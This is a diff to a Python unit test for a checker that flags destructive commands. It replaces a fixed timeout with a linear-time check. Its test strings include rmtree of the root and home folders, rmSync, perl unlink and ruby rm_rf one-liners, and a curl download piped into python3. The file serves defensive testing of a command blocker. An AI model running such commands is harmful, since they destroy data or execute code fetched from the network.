@@ -2,10 +2,10 @@
 folder (rm_root_home), and a download piped into an interpreter (pipe_to_shell), Python side: the same cases as
 test/command_interpreters.test.js. Fictitious hosts and paths only; nothing here is run."""
 
-import time
 import unittest
 
 from zn_gate.destructive import check_command
+from ._timing import assert_linear
 
 U = "https://example.com/i.py"
 
@@ -115,23 +115,22 @@ class InterpreterOneLinerTests(unittest.TestCase):
             self.assertEqual(check_command(c).verdict, "allow", c)
 
     def test_long_input_is_read_in_linear_time(self):
+        # (size, build): build(n) makes the command from n repeats; 4x the repeats takes under 8x the CPU time.
         pads = [
-            'python3 -c "' + "rmtree " * 9000 + '"',
-            'python3 -c "' + "rmtree(" * 9000 + '"',
-            'node -e "' + "rmSync(" * 9000 + '"',
-            "perl -e '" + "unlink glob (" * 5000 + "'",
-            "ruby -e '" + "rm_rf " * 9000 + "'",
-            "python3 -c \"shutil.rmtree(" + " " * 65000 + "'/')\"",
-            'python3 -c "shutil.rmtree(Path' + " " * 65000 + "('/'))\"",
-            'node -e "rmSync(os' + "." * 30000 + 'homedir()"',
-            'python3 -c "' + "shutil.rmtree(os.path.expanduser('~' " * 2000 + '"',
-            'python3 -c "' + "x" * 65000 + '"',
-            "curl " + U + " | python3 " + "-W " * 20000,
+            (9000, lambda n: 'python3 -c "' + "rmtree " * n + '"'),
+            (9000, lambda n: 'python3 -c "' + "rmtree(" * n + '"'),
+            (9000, lambda n: 'node -e "' + "rmSync(" * n + '"'),
+            (5000, lambda n: "perl -e '" + "unlink glob (" * n + "'"),
+            (9000, lambda n: "ruby -e '" + "rm_rf " * n + "'"),
+            (65000, lambda n: "python3 -c \"shutil.rmtree(" + " " * n + "'/')\""),
+            (65000, lambda n: 'python3 -c "shutil.rmtree(Path' + " " * n + "('/'))\""),
+            (30000, lambda n: 'node -e "rmSync(os' + "." * n + 'homedir()"'),
+            (2000, lambda n: 'python3 -c "' + "shutil.rmtree(os.path.expanduser('~' " * n + '"'),
+            (65000, lambda n: 'python3 -c "' + "x" * n + '"'),
+            (20000, lambda n: "curl " + U + " | python3 " + "-W " * n),
         ]
-        for c in pads:
-            t0 = time.perf_counter()
-            check_command(c)
-            self.assertLess(time.perf_counter() - t0, 3.0, c[:40])
+        for size, build in pads:
+            assert_linear(check_command, build, size, build(8)[:40])
 
     def test_padded_delete_call_is_still_found(self):
         pad = "x = 1\n" * 5000
